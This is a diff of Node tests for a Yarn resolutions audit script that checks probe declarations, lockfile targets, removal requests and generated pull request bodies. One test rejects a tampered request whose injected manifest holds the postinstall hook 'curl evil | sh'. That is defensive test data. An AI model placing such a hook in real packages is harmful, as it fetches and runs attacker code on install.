@@ -3,11 +3,20 @@ import test from "node:test";
 
 import { AuditPolicyError } from "./npm-audit-policy.mjs";
 import {
+  applyRemoval,
+  assertProbeTargetsInLockfile,
+  assertRemovalArtifactFiles,
+  authorizeRemoval,
   checkSync,
+  parseRemovalRequest,
+  classifyProbe,
   evaluateStaleness,
   parseNonSecurityResolutions,
   parseResolutionsRegistry,
+  renderProbeSummary,
+  renderRemovalPullRequestBody,
   renderResolutionsSummary,
+  summarizeYarnFailure,
 } from "./yarn-resolutions-audit.mjs";
 
 const GHSA = "GHSA-4cwx-7wf7-3272";
@@ -28,6 +37,18 @@ function nonSecurityEntry(overrides = {}) {
   return {
     pattern: "@types/react",
     reason: "React 18 系に型を揃えるためのバージョン統一",
+    ...overrides,
+  };
+}
+
+const TRACKING_URL = "https://github.com/yarnpkg/berry/issues/7281";
+
+function probedEntry(overrides = {}) {
+  return {
+    pattern: "@yarnpkg/core/got",
+    reason: "上流が壊れた patch 記述子のまま公開しているため npm 版に上書きする",
+    probe: { up: ["@backstage/cli"] },
+    tracking: TRACKING_URL,
     ...overrides,
   };
 }
@@ -126,6 +147,99 @@ test("parses empty non-security input as an empty list", () => {
   assert.deepEqual(parseNonSecurityResolutions("[]"), []);
 });
 
+test("parses a non-security declaration with probe and tracking", () => {
+  const entry = probedEntry();
+  assert.deepEqual(parseNonSecurityResolutions(JSON.stringify([entry])), [
+    entry,
+  ]);
+});
+
+test("parses probe and tracking independently of each other", () => {
+  const probeOnly = probedEntry({ tracking: undefined });
+  delete probeOnly.tracking;
+  assert.deepEqual(parseNonSecurityResolutions(JSON.stringify([probeOnly])), [
+    { pattern: probeOnly.pattern, reason: probeOnly.reason, probe: probeOnly.probe },
+  ]);
+
+  const trackingOnly = probedEntry({ probe: undefined });
+  delete trackingOnly.probe;
+  assert.deepEqual(
+    parseNonSecurityResolutions(JSON.stringify([trackingOnly])),
+    [
+      {
+        pattern: trackingOnly.pattern,
+        reason: trackingOnly.reason,
+        tracking: TRACKING_URL,
+      },
+    ],
+  );
+});
+
+test("rejects malformed probe and tracking values", async (t) => {
+  const invalidCases = [
+    {
+      name: "probe is not an object",
+      raw: JSON.stringify([probedEntry({ probe: true })]),
+      message: /probe must be an object with up/,
+    },
+    {
+      name: "probe with an unknown key",
+      raw: JSON.stringify([
+        probedEntry({ probe: { up: ["@backstage/cli"], steps: ["yarn tsc"] } }),
+      ]),
+      message: /probe must contain exactly up/,
+    },
+    {
+      name: "probe with empty up",
+      raw: JSON.stringify([probedEntry({ probe: { up: [] } })]),
+      message: /probe.up must be a non-empty array of package names/,
+    },
+    {
+      name: "probe with a non-string up target",
+      raw: JSON.stringify([probedEntry({ probe: { up: [7] } })]),
+      message: /probe.up must be a non-empty array of package names/,
+    },
+    {
+      name: "probe with a glob up target",
+      raw: JSON.stringify([probedEntry({ probe: { up: ["@backstage/*"] } })]),
+      message: /probe.up must be a non-empty array of package names/,
+    },
+    {
+      name: "probe with a ranged up target",
+      raw: JSON.stringify([probedEntry({ probe: { up: ["@backstage/cli@^0.36.6"] } })]),
+      message: /probe.up must be a non-empty array of package names/,
+    },
+    {
+      name: "probe with duplicate up targets",
+      raw: JSON.stringify([
+        probedEntry({ probe: { up: ["@backstage/cli", "@backstage/cli"] } }),
+      ]),
+      message: /probe.up contains duplicates/,
+    },
+    {
+      name: "tracking is not an https URL",
+      raw: JSON.stringify([probedEntry({ tracking: "berry#7281" })]),
+      message: /tracking must be an https URL/,
+    },
+    {
+      name: "tracking is not a string",
+      raw: JSON.stringify([probedEntry({ tracking: 7281 })]),
+      message: /tracking must be an https URL/,
+    },
+  ];
+
+  for (const invalidCase of invalidCases) {
+    await t.test(invalidCase.name, () => {
+      assert.throws(
+        () => parseNonSecurityResolutions(invalidCase.raw),
+        (error) =>
+          error instanceof AuditPolicyError &&
+          invalidCase.message.test(error.message),
+      );
+    });
+  }
+});
+
 test("rejects malformed non-security declarations", async (t) => {
   const invalidCases = [
     { name: "non-array", raw: "{}", message: /must be a JSON array/ },
@@ -133,7 +247,12 @@ test("rejects malformed non-security declarations", async (t) => {
     {
       name: "unknown field",
       raw: JSON.stringify([{ ...nonSecurityEntry(), advisories: [GHSA] }]),
-      message: /must contain exactly pattern and reason/,
+      message: /must contain pattern and reason, optionally probe and tracking/,
+    },
+    {
+      name: "missing reason",
+      raw: JSON.stringify([{ pattern: "@types/react", tracking: TRACKING_URL }]),
+      message: /must contain pattern and reason, optionally probe and tracking/,
     },
     {
       name: "empty pattern",
@@ -308,4 +427,323 @@ test("summary marks stale entries with a removal instruction", () => {
 
   assert.match(summary, /blocked \(stale resolutions found\)/);
   assert.match(summary, /stale: remove this resolution and its registry entry/);
+});
+
+const LOCKFILE_SAMPLE = [
+  '"@backstage/cli@npm:^0.36.5":',
+  "  version: 0.36.5",
+  "",
+  '"minimist@npm:^1.2.0, minimist@npm:^1.2.6":',
+  "  version: 1.2.8",
+  "",
+  '"app@workspace:packages/app":',
+  "  version: 0.0.0-use.local",
+  "",
+].join("\n");
+
+test("accepts probe targets that are npm dependencies in the lockfile", () => {
+  assert.doesNotThrow(() =>
+    assertProbeTargetsInLockfile(probedEntry(), LOCKFILE_SAMPLE),
+  );
+  assert.doesNotThrow(() =>
+    assertProbeTargetsInLockfile(
+      probedEntry({ probe: { up: ["minimist"] } }),
+      LOCKFILE_SAMPLE,
+    ),
+  );
+});
+
+test("rejects probe targets that yarn up -R would match vacuously", () => {
+  for (const target of ["no-such-package", "cli", "app", "@backstage/cli-common"]) {
+    assert.throws(
+      () =>
+        assertProbeTargetsInLockfile(
+          probedEntry({ probe: { up: [target] } }),
+          LOCKFILE_SAMPLE,
+        ),
+      (error) =>
+        error instanceof AuditPolicyError &&
+        new RegExp(`names ${target.replace(/[-/\\^$*+?.()|[\]{}]/g, "\\$&")}, which is not an npm dependency`).test(
+          error.message,
+        ),
+      `target ${target} should be rejected`,
+    );
+  }
+});
+
+test("summarizes a yarn failure by its report lines instead of the stack trace tail", () => {
+  const stdout = [
+    "➤ YN0000: ┌ Resolution step",
+    "➤ YN0001: │ Error: got@patch:got@npm%3A11.8.2#~/.yarn/patches/got.patch: ENOENT: no such file or directory",
+    "    at Object.openSync (node:fs:573:18)",
+    "    at bundled (/tmp/x/.yarn/releases/yarn-4.13.0.cjs:1:12345)",
+    "➤ YN0000: └ Completed",
+    "➤ YN0000: · Failed with errors in 0s 42ms",
+  ].join("\n");
+
+  const summary = summarizeYarnFailure(stdout, "");
+  assert.match(summary, /YN0001: │ Error: got@patch/);
+  assert.match(summary, /Failed with errors/);
+  assert.doesNotMatch(summary, /at Object.openSync/);
+  assert.doesNotMatch(summary, /yarn-4.13.0.cjs/);
+
+  // 報告行が無いときだけ末尾を返す
+  assert.equal(summarizeYarnFailure("plain tail\n", ""), "plain tail");
+});
+
+test("classifies a probe as removable only when the control run passed", () => {
+  const entry = probedEntry();
+
+  assert.equal(classifyProbe(entry, 0, 0), "removable");
+  assert.equal(classifyProbe(entry, 0, 1), "needed");
+});
+
+test("treats a failing control run as a mechanism failure, not as removable", () => {
+  const entry = probedEntry();
+
+  assert.throws(
+    () => classifyProbe(entry, 1, 0),
+    (error) =>
+      error instanceof AuditPolicyError &&
+      /probe control run for @yarnpkg\/core\/got failed/.test(error.message) &&
+      /yarn up -R @backstage\/cli/.test(error.message),
+  );
+  assert.throws(
+    () => classifyProbe(entry, null, null),
+    (error) => error instanceof AuditPolicyError,
+  );
+});
+
+test("applyRemoval drops the resolution and its declaration without touching others", () => {
+  const manifest = {
+    name: "root",
+    resolutions: {
+      "@types/react": "^18",
+      "@yarnpkg/core/got": "npm:11.8.2",
+      "undici@npm:7.28.0": "^7.29.0",
+    },
+  };
+  const result = applyRemoval(
+    manifest,
+    [nonSecurityEntry(), probedEntry()],
+    ["@yarnpkg/core/got"],
+  );
+
+  assert.deepEqual(result.manifest, {
+    name: "root",
+    resolutions: { "@types/react": "^18", "undici@npm:7.28.0": "^7.29.0" },
+  });
+  assert.deepEqual(result.nonSecurity, [nonSecurityEntry()]);
+  // 入力は変更しない
+  assert.equal(manifest.resolutions["@yarnpkg/core/got"], "npm:11.8.2");
+});
+
+test("applyRemoval removes the resolutions key when nothing is left", () => {
+  const result = applyRemoval(
+    { name: "root", resolutions: { "@yarnpkg/core/got": "npm:11.8.2" } },
+    [probedEntry()],
+    ["@yarnpkg/core/got"],
+  );
+
+  assert.deepEqual(result.manifest, { name: "root" });
+  assert.deepEqual(result.nonSecurity, []);
+});
+
+test("applyRemoval fails closed on a pattern missing from package.json", () => {
+  assert.throws(
+    () => applyRemoval({ resolutions: {} }, [probedEntry()], ["@yarnpkg/core/got"]),
+    (error) =>
+      error instanceof AuditPolicyError &&
+      /not present in package.json resolutions/.test(error.message),
+  );
+});
+
+test("probe summary lists removable, needed, and not probed entries", () => {
+  const summary = renderProbeSummary(
+    [
+      { entry: probedEntry(), resolution: "npm:11.8.2", outcome: "needed" },
+      {
+        entry: probedEntry({ pattern: "prettier@npm:^3.9.6", tracking: undefined }),
+        resolution: "^3.9.6",
+        outcome: "removable",
+      },
+    ],
+    [nonSecurityEntry()],
+  );
+
+  assert.match(summary, /- Removable: 1/);
+  assert.match(summary, /- Still needed: 1/);
+  assert.match(summary, /- Not probed \(no probe declared\): 1/);
+  assert.match(summary, /@yarnpkg\/core\/got \| @backstage\/cli \| https:\/\/github.com\/yarnpkg\/berry\/issues\/7281 \| still needed/);
+  assert.match(summary, /prettier@npm:\^3.9.6 \| @backstage\/cli \| - \| removable: removal pull request will be created/);
+  assert.match(summary, /@types\/react \| - \| - \| not probed/);
+});
+
+test("removal pull request body satisfies the PR policy and names each resolution", () => {
+  const body = renderRemovalPullRequestBody(
+    [{ entry: probedEntry(), resolution: "npm:11.8.2", outcome: "removable" }],
+    { runUrl: "https://github.com/kmryst/idp-golden-path/actions/runs/1" },
+  );
+
+  assert.match(body, /^## 目的/m);
+  assert.match(body, /probe を実行した run: https:\/\/github.com\/kmryst\/idp-golden-path\/actions\/runs\/1/);
+  assert.match(body, /`@yarnpkg\/core\/got` \| `npm:11.8.2` \| `@backstage\/cli` \| https:\/\/github.com\/yarnpkg\/berry\/issues\/7281/);
+  assert.match(body, /^## 変更内容/m);
+  assert.match(body, /^## 可観測性\/検証/m);
+  assert.match(body, /ADR-0015/);
+  // PR Policy Check の Issue リンク規約: (close[sd]?|fix(e[sd])?|refs?) #[0-9]+
+  assert.match(body, /^Refs #291$/m);
+});
+
+test("removal pull request body tells the reviewer to run yarn install when the lockfile changes", () => {
+  const changes = renderRemovalPullRequestBody(
+    [{ entry: probedEntry(), resolution: "npm:11.8.2" }],
+    { lockfileChanges: true },
+  );
+  assert.match(changes, /^> \[!IMPORTANT\]\n> \*\*この PR は Draft です。`backstage\/` で `yarn install` を実行して `yarn.lock` をコミットしてから Ready for review にする。\*\*/);
+  assert.match(changes, /\n## 目的/);
+
+  const noChanges = renderRemovalPullRequestBody([
+    { entry: probedEntry(), resolution: "npm:11.8.2" },
+  ]);
+  assert.doesNotMatch(noChanges, /\[!IMPORTANT\]/);
+  assert.match(noChanges, /`backstage\/yarn.lock` は変わらない/);
+  assert.match(noChanges, /`backstage\/yarn.lock` は変更しない/);
+});
+
+test("parses a canonical removal request", () => {
+  assert.deepEqual(
+    parseRemovalRequest(
+      JSON.stringify({ patterns: ["@yarnpkg/core/got"], lockfileChanges: false }),
+    ),
+    { patterns: ["@yarnpkg/core/got"], lockfileChanges: false },
+  );
+});
+
+test("rejects a tampered or malformed removal request", async (t) => {
+  const invalidCases = [
+    { name: "invalid JSON", raw: "{", message: /must be valid JSON/ },
+    { name: "non-object", raw: "[]", message: /must be a JSON object/ },
+    {
+      name: "extra field carrying a manifest",
+      raw: JSON.stringify({
+        patterns: ["@yarnpkg/core/got"],
+        lockfileChanges: false,
+        manifest: { scripts: { postinstall: "curl evil | sh" } },
+      }),
+      message: /exactly patterns and lockfileChanges/,
+    },
+    {
+      name: "missing lockfileChanges",
+      raw: JSON.stringify({ patterns: ["@yarnpkg/core/got"] }),
+      message: /exactly patterns and lockfileChanges/,
+    },
+    {
+      name: "empty patterns",
+      raw: JSON.stringify({ patterns: [], lockfileChanges: false }),
+      message: /non-empty array of resolution keys/,
+    },
+    {
+      name: "non-string pattern",
+      raw: JSON.stringify({ patterns: [{}], lockfileChanges: false }),
+      message: /non-empty array of resolution keys/,
+    },
+    {
+      name: "duplicate patterns",
+      raw: JSON.stringify({
+        patterns: ["@yarnpkg/core/got", "@yarnpkg/core/got"],
+        lockfileChanges: false,
+      }),
+      message: /contains duplicates/,
+    },
+    {
+      name: "non-boolean lockfileChanges",
+      raw: JSON.stringify({ patterns: ["@yarnpkg/core/got"], lockfileChanges: "no" }),
+      message: /lockfileChanges must be a boolean/,
+    },
+  ];
+
+  for (const invalidCase of invalidCases) {
+    await t.test(invalidCase.name, () => {
+      assert.throws(
+        () => parseRemovalRequest(invalidCase.raw),
+        (error) =>
+          error instanceof AuditPolicyError && invalidCase.message.test(error.message),
+      );
+    });
+  }
+});
+
+test("accepts an artifact that contains only removal.json", () => {
+  assert.doesNotThrow(() => assertRemovalArtifactFiles(["removal.json"]));
+});
+
+test("rejects an artifact that carries any other file", () => {
+  for (const files of [
+    [],
+    ["removal.json", "package.json"],
+    ["removal.json", "yarn.lock"],
+    ["pull-request-body.md"],
+  ]) {
+    assert.throws(
+      () => assertRemovalArtifactFiles(files),
+      (error) =>
+        error instanceof AuditPolicyError &&
+        /must contain only removal.json/.test(error.message),
+      `files ${JSON.stringify(files)} should be rejected`,
+    );
+  }
+});
+
+test("authorizes only probed declarations that exist in package.json", () => {
+  const nonSecurity = [nonSecurityEntry(), probedEntry()];
+  const resolutions = { "@types/react": "^18", "@yarnpkg/core/got": "npm:11.8.2" };
+
+  const authorized = authorizeRemoval(
+    { patterns: ["@yarnpkg/core/got"], lockfileChanges: false },
+    nonSecurity,
+    resolutions,
+  );
+  assert.deepEqual(authorized, [{ entry: probedEntry(), resolution: "npm:11.8.2" }]);
+
+  const rejected = [
+    {
+      name: "pattern without probe",
+      patterns: ["@types/react"],
+      message: /has no probe .*; refusing to remove it/,
+    },
+    {
+      name: "pattern not declared anywhere",
+      patterns: ["undici@npm:7.28.0"],
+      message: /is not declared in yarn-resolutions-non-security.json; refusing to remove it/,
+    },
+    {
+      name: "declared but missing from package.json",
+      patterns: ["prettier@npm:^3.9.6"],
+      nonSecurity: [...nonSecurity, probedEntry({ pattern: "prettier@npm:^3.9.6" })],
+      message: /is not present in package.json resolutions; refusing to remove it/,
+    },
+  ];
+  for (const testCase of rejected) {
+    assert.throws(
+      () =>
+        authorizeRemoval(
+          { patterns: testCase.patterns, lockfileChanges: false },
+          testCase.nonSecurity ?? nonSecurity,
+          resolutions,
+        ),
+      (error) =>
+        error instanceof AuditPolicyError && testCase.message.test(error.message),
+      testCase.name,
+    );
+  }
+});
+
+test("removal pull request body omits the run line without run metadata", () => {
+  const body = renderRemovalPullRequestBody([
+    { entry: probedEntry(), resolution: "npm:11.8.2", outcome: "removable" },
+  ]);
+
+  assert.doesNotMatch(body, /probe を実行した run/);
+  assert.match(body, /^Refs #291$/m);
 });
